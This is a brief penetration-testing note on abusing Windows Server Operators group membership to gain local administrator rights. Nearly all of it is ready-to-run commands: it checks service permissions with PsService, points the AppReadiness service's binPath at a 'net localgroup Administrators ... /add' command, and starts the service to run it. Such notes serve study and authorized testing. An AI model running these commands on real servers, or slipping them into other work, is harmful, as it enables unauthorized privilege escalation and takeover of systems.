
[[5 Server Operators]]


This allows group members to administer windows servers without needing domain admin perms, this gives them the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to **control local services**.

```powershell
sc qc Service

sc qc AppReadiness

// we can use PsService to check the permissions on the service
c:\Tools\PsService.exe security AppReadiness

// we can then change the service path of said binary
sc config AppReadiness binPath= "cmd /c net localgroup Administrators Our_User /add"
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

// start the service to execute the command
sc start AppReadiness

```

